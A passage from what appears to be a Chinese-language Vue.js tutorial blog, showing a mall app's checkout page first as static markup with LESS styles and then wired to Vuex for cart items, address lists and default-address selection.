class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="pay"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="订单结算台"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 地址相关 --&gt;</span><br><span class="line">    &lt;div class="address"&gt;</span><br><span class="line">      &lt;div class="left-icon"&gt;</span><br><span class="line">        &lt;van-icon name="logistics" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="info" v-if="true"&gt;</span><br><span class="line">        &lt;div class="info-content"&gt;</span><br><span class="line">          &lt;span class="name"&gt;小红&lt;/span&gt;</span><br><span class="line">          &lt;span class="mobile"&gt;13811112222&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="info-address"&gt;江苏省 无锡市 南长街 110号 504&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="info" v-else&gt;请选择配送地址&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="right-icon"&gt;</span><br><span class="line">        &lt;van-icon name="arrow" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 订单明细 --&gt;</span><br><span class="line">    &lt;div class="pay-list"&gt;</span><br><span class="line">      &lt;div class="list"&gt;</span><br><span class="line">        &lt;div class="goods-item"&gt;</span><br><span class="line">          &lt;div class="left"&gt;</span><br><span class="line">            &lt;img</span><br><span class="line">              src="http://cba.itlike.com/public/uploads/10001/20230321/8f505c6c437fc3d4b4310b57b1567544.jpg"</span><br><span class="line">              alt=""</span><br><span class="line">            /&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="right"&gt;</span><br><span class="line">            &lt;p class="tit text-ellipsis-2"&gt;</span><br><span class="line">              三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景</span><br><span class="line">              悠雾紫 5G手机 游戏拍照旗舰机s23</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">            &lt;p class="info"&gt;</span><br><span class="line">              &lt;span class="count"&gt;x3&lt;/span&gt;</span><br><span class="line">              &lt;span class="price"&gt;¥9.99&lt;/span&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="flow-num-box"&gt;</span><br><span class="line">        &lt;span&gt;共 12 件商品，合计：&lt;/span&gt;</span><br><span class="line">        &lt;span class="money"&gt;￥1219.00&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="pay-detail"&gt;</span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;订单总金额：&lt;/span&gt;</span><br><span class="line">          &lt;span class="red"&gt;￥1219.00&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;优惠券：&lt;/span&gt;</span><br><span class="line">          &lt;span&gt;无优惠券可用&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;配送费用：&lt;/span&gt;</span><br><span class="line">          &lt;span v-if="false"&gt;请先选择配送地址&lt;/span&gt;</span><br><span class="line">          &lt;span v-else class="red"&gt;+￥0.00&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- 支付方式 --&gt;</span><br><span class="line">      &lt;div class="pay-way"&gt;</span><br><span class="line">        &lt;span class="tit"&gt;支付方式&lt;/span&gt;</span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span</span><br><span class="line">            &gt;&lt;van-icon name="balance-o" /&gt;余额支付（可用 ¥ 999919.00 元）&lt;/span</span><br><span class="line">          &gt;</span><br><span class="line">          &lt;!-- &lt;span&gt;请先选择配送地址&lt;/span&gt; --&gt;</span><br><span class="line">          &lt;span class="red"&gt;&lt;van-icon name="passed" /&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- 买家留言 --&gt;</span><br><span class="line">      &lt;div class="buytips"&gt;</span><br><span class="line">        &lt;textarea</span><br><span class="line">          placeholder="选填：买家留言（50字内）"</span><br><span class="line">          name=""</span><br><span class="line">          id=""</span><br><span class="line">          cols="30"</span><br><span class="line">          rows="10"</span><br><span class="line">        &gt;&lt;/textarea&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 底部提交 --&gt;</span><br><span class="line">    &lt;div class="footer-fixed"&gt;</span><br><span class="line">      &lt;div class="left"&gt;实付款：&lt;span&gt;￥999919&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class="tipsbtn"&gt;提交订单&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  name: "PayIndex",</span><br><span class="line">  data() {</span><br><span class="line">    return {};</span><br><span class="line">  },</span><br><span class="line">  methods: {},</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.pay {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  padding-bottom: 46px;</span><br><span class="line">  ::v-deep {</span><br><span class="line">    .van-nav-bar__arrow {</span><br><span class="line">      color: #333;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.address {</span><br><span class="line">  display: flex;</span><br><span class="line">  align-items: center;</span><br><span class="line">  justify-content: flex-start;</span><br><span class="line">  padding: 20px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  color: #666;</span><br><span class="line">  position: relative;</span><br><span class="line">  background: url(@/assets/border-line.png) bottom repeat-x;</span><br><span class="line">  background-size: 60px auto;</span><br><span class="line">  .left-icon {</span><br><span class="line">    margin-right: 20px;</span><br><span class="line">  }</span><br><span class="line">  .right-icon {</span><br><span class="line">    position: absolute;</span><br><span class="line">    right: 20px;</span><br><span class="line">    top: 50%;</span><br><span class="line">    transform: translateY(-7px);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.goods-item {</span><br><span class="line">  height: 100px;</span><br><span class="line">  margin-bottom: 6px;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  .left {</span><br><span class="line">    width: 100px;</span><br><span class="line">    img {</span><br><span class="line">      display: block;</span><br><span class="line">      width: 80px;</span><br><span class="line">      margin: 10px auto;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .right {</span><br><span class="line">    flex: 1;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    line-height: 1.3;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    padding-right: 0px;</span><br><span class="line">    display: flex;</span><br><span class="line">    flex-direction: column;</span><br><span class="line">    justify-content: space-evenly;</span><br><span class="line">    color: #333;</span><br><span class="line">    .info {</span><br><span class="line">      margin-top: 5px;</span><br><span class="line">      display: flex;</span><br><span class="line">      justify-content: space-between;</span><br><span class="line">      .price {</span><br><span class="line">        color: #fa2209;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.flow-num-box {</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: flex-end;</span><br><span class="line">  padding: 10px 10px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">  .money {</span><br><span class="line">    color: #fa2209;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.pay-cell {</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  padding: 10px 12px;</span><br><span class="line">  color: #333;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  .red {</span><br><span class="line">    color: #fa2209;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">.pay-detail {</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.pay-way {</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  padding: 10px 12px;</span><br><span class="line">  border-bottom: 1px solid #efefef;</span><br><span class="line">  color: #333;</span><br><span class="line">  .tit {</span><br><span class="line">    line-height: 30px;</span><br><span class="line">  }</span><br><span class="line">  .pay-cell {</span><br><span class="line">    padding: 10px 0;</span><br><span class="line">  }</span><br><span class="line">  .van-icon {</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    margin-right: 5px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.buytips {</span><br><span class="line">  display: block;</span><br><span class="line">  textarea {</span><br><span class="line">    display: block;</span><br><span class="line">    width: 100%;</span><br><span class="line">    border: none;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    padding: 12px;</span><br><span class="line">    height: 100px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.footer-fixed {</span><br><span class="line">  position: fixed;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  left: 0;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 46px;</span><br><span class="line">  line-height: 46px;</span><br><span class="line">  border-top: 1px solid #efefef;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  display: flex;</span><br><span class="line">  .left {</span><br><span class="line">    flex: 1;</span><br><span class="line">    padding-left: 12px;</span><br><span class="line">    color: #666;</span><br><span class="line">    span {</span><br><span class="line">      color: #fa2209;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .tipsbtn {</span><br><span class="line">    width: 121px;</span><br><span class="line">    background: linear-gradient(90deg, #f9211c, #ff6335);</span><br><span class="line">    color: #fff;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 46px;</span><br><span class="line">    display: block;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="渲染-2"><a class="markdownIt-Anchor" href="#渲染-2"></a> 渲染</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="pay"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="订单结算台"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 地址相关 --&gt;</span><br><span class="line">    &lt;div class="address"&gt;</span><br><span class="line">      &lt;div class="left-icon"&gt;</span><br><span class="line">        &lt;van-icon name="logistics" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="info" v-if="addressList.length &gt; 0"&gt;</span><br><span class="line">        &lt;div class="info-content"&gt;</span><br><span class="line">          &lt;span class="name"&gt;{{ chosenAddress.name }} &lt;/span&gt;</span><br><span class="line">          &lt;span class="mobile"&gt;{{ chosenAddress.phone }}&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="info-address"&gt;</span><br><span class="line">          {{ regionName.province }} {{ regionName.city }}</span><br><span class="line">          {{ regionName.county }} {{ chosenAddress.detail }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="info" v-else&gt;还没有地址哦，点击右侧按钮添加吧&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="right-icon" @click="$router.push('/address/manage')"&gt;</span><br><span class="line">        &lt;van-icon name="arrow" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 订单明细 --&gt;</span><br><span class="line">    &lt;div class="pay-list"&gt;</span><br><span class="line">      &lt;div class="list"&gt;</span><br><span class="line">        &lt;div class="goods-item" v-for="item in cartList" :key="item.id"&gt;</span><br><span class="line">          &lt;div class="left"&gt;</span><br><span class="line">            &lt;img :src="item.goods.goods_image" alt="" /&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">          &lt;div class="right"&gt;</span><br><span class="line">            &lt;p class="tit text-ellipsis-2"&gt;</span><br><span class="line">              {{ item.goods.goods_name }}</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">            &lt;p class="info"&gt;</span><br><span class="line">              &lt;span class="count"&gt;共{{ item.goods_num }}件&lt;/span&gt;</span><br><span class="line">              &lt;span class="price"</span><br><span class="line">                &gt;¥{{ item.goods.goods_price_min * item.goods_num }}&lt;/span</span><br><span class="line">              &gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="flow-num-box"&gt;</span><br><span class="line">        &lt;span&gt;共 {{ selectedCartCount() }} 件商品，合计：&lt;/span&gt;</span><br><span class="line">        &lt;span class="money"&gt;￥{{ selectedPrice() }}&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="pay-detail"&gt;</span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;订单总金额：&lt;/span&gt;</span><br><span class="line">          &lt;span class="red"&gt;￥{{ selectedPrice() }}&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;优惠券：&lt;/span&gt;</span><br><span class="line">          &lt;span&gt;无优惠券可用&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span&gt;配送费用：&lt;/span&gt;</span><br><span class="line">          &lt;span v-if="false"&gt;请先选择配送地址&lt;/span&gt;</span><br><span class="line">          &lt;span v-else class="red"&gt;+￥0.00&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- 支付方式 --&gt;</span><br><span class="line">      &lt;div class="pay-way"&gt;</span><br><span class="line">        &lt;span class="tit"&gt;支付方式&lt;/span&gt;</span><br><span class="line">        &lt;div class="pay-cell"&gt;</span><br><span class="line">          &lt;span</span><br><span class="line">            &gt;&lt;van-icon name="balance-o" /&gt;余额支付（可用 ¥ 999919.00 元）&lt;/span</span><br><span class="line">          &gt;</span><br><span class="line">          &lt;!-- &lt;span&gt;请先选择配送地址&lt;/span&gt; --&gt;</span><br><span class="line">          &lt;span class="red"&gt;&lt;van-icon name="passed" /&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;!-- 买家留言 --&gt;</span><br><span class="line">      &lt;div class="buytips"&gt;</span><br><span class="line">        &lt;textarea</span><br><span class="line">          placeholder="选填：买家留言（50字内）"</span><br><span class="line">          name=""</span><br><span class="line">          id=""</span><br><span class="line">          cols="30"</span><br><span class="line">          rows="10"</span><br><span class="line">        &gt;&lt;/textarea&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 底部提交 --&gt;</span><br><span class="line">    &lt;div class="footer-fixed"&gt;</span><br><span class="line">      &lt;div class="left"&gt;</span><br><span class="line">        实付款：&lt;span&gt;￥{{ selectedPrice() }}&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="tipsbtn" @click="$router.push('/order/confirm')"&gt;</span><br><span class="line">        提交订单</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { mapActions, mapGetters } from "vuex";</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  name: "PayIndex",</span><br><span class="line">  async created() {</span><br><span class="line">    // 构建地区映射表</span><br><span class="line">    await this.buildReverseMaps();</span><br><span class="line"></span><br><span class="line">    // 处理购物车详情展示</span><br><span class="line">    // 拉取购物车列表</span><br><span class="line">    await this.getCartAction();</span><br><span class="line">    this.cartList = this.selectedCartList();</span><br><span class="line">    console.log("购物车列表：", this.cartList);</span><br><span class="line"></span><br><span class="line">    // 获取地址列表</span><br><span class="line">    const { list } = await this.getAddressList();</span><br><span class="line">    this.addressList = list;</span><br><span class="line">    console.log("地址列表：", this.addressList);</span><br><span class="line"></span><br><span class="line">    // 从Vuex中获取默认地址的id</span><br><span class="line">    const defaultAddressId = this.getDefaultAddressId();</span><br><span class="line">    console.log("默认地址id：", defaultAddressId);</span><br><span class="line"></span><br><span class="line">    if (this.addressList.length &gt; 0) {</span><br><span class="line">      // 如果有地址查询参数?adsid，则说明进行了地址切换</span><br><span class="line">      console.log("地址切换参数：", this.getadsid);</span><br><span class="line">      if (this.getadsid) {</span><br><span class="line">        // chosenAddress被赋值为切换的id的地址</span><br><span class="line">        const address = this.addressList.find(</span><br><span class="line">          (item) =&gt; String(item.address_id) === String(this.getadsid)</span><br><span class="line">        );</span><br><span class="line">        this.chosenAddress = address;</span><br><span class="line">        console.log("切换后的地址：", this.chosenAddress);</span><br><span class="line">      } else {</span><br><span class="line">        // 如果没有地址切换参数，则说明没有切换地址</span><br><span class="line">        if (Number(defaultAddressId) !== -1) {</span><br><span class="line">          // 遍历比对列表每一项的id是否与defaultAddressId相等，找到后返回索引（强等于比较，注意类型）</span><br><span class="line">          const defaultIndex = this.addressList.findIndex(</span><br><span class="line">            (item) =&gt; String(item.address_id) === String(defaultAddressId)</span><br><span class="line">          );</span><br><span class="line">          // console.log('默认地址索引：', 